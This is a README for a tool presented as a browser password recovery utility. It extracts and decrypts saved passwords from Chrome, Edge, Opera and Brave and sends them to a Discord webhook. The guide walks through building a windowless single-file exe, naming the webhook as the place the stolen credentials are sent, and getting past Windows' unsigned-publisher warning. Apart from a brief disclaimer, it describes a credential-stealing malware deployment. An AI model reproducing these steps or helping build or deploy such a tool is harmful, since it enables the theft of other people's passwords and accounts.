# 🔐 Browser Password Recovery Tool 🔐

## 📱 Overview

This tool helps you recover saved passwords from Chrome, Edge, Opera and Brave browsers when you've forgotten them. Perfect for IT professionals who need to retrieve credentials for work purposes or individuals who need to recover their own forgotten passwords.

## ✨ Features

- 🔍 Recovers saved passwords from **Chrome**, **Edge**, **Opera**, and **Brave**
- 👤 Works with multiple browser profiles
- 🔄 Automatically decrypt the passwords and send them to **Discord Webhook**
- 📊 Provides a neat summary of recovered credentials
- 🛠️ Can be compiled into a single `.exe` using **PyInstaller**

## 🚀 Quick Start

### 📋 Requirements

- Windows operating system
- Python 3.x (for compiling the `.exe`)
- Browsers: Chrome, Brave, Edge, or Opera
- Required Python libraries:
  - `pycryptodomex`
  - `pywin32`
  - `requests`
  - `pyinstaller`

    ```bash
    pip install pycryptodomex pywin32 requests pyinstaller
    ```

  - A valid Discord webhook URL

### 🌐 Setting Up Your Webhook

1. Create a Discord server (if you don’t have one).
2. Go to **Server Settings > Integrations > Webhooks**
3. Create a new webhook and **copy the URL**
4. In `browser_password_recovery.py`, replace this line:

```python
WEBHOOK_URL = "discord_webhook_url"
```

⚠️ Be sure to replace `discord_webhook_url` with your actual webhook URL where the password data will be sent.

### 🐍 Generate the Executable (.exe)

To make the tool portable:

```bash
pyinstaller --onefile --noconsole --hidden-import=pycryptodome --hidden-import=win32crypt --hidden-import=requests .\browser_password_recovery.py
```

The `.exe` will appear in the `dist/` folder (e.g., `dist/browser_password_recovery.exe`).

### 4️⃣ Run the Tool

Double-click the `.exe` on a Windows machine where browsers are installed.

The script will:

- Locate saved credentials
- Decrypt them using system-protected keys
- Send them to your Discord webhook 

> ⚠️ If Windows shows an "Unknown Publisher" warning, click **"More info"** then **"Run anyway"** (expected behavior for unsigned executables).

## ⚙️ How It Works

1. Locates browser user data folders and encrypted `Login Data` SQLite DBs
2. Extracts the master key from the browser’s `Local State` file
3. Decrypts passwords using **AES-GCM** and Windows Data Protection API
4. Formats and sends results to the specified Discord webhook

## 🍄 Example Output
Example of what you'll receive in the webhook:

```
Browser: chrome (Default)
URL: https://example.com/login
Username: admin
Password: password
------------------------
Total credentials: 1
```

## 🛑 Important Notes

- This tool is designed for **legitimate password recovery** of your own accounts or within authorized systems
- Always obtain proper authorization before recovering passwords on systems you don't own
- Use responsibly and ethically

## ⭐ Credits -

This is the python version of powershell script created by - https://github.com/pentestfunctions.
You can find the original tool here -

```
https://github.com/pentestfunctions/chrome_brave_password_webhook/
```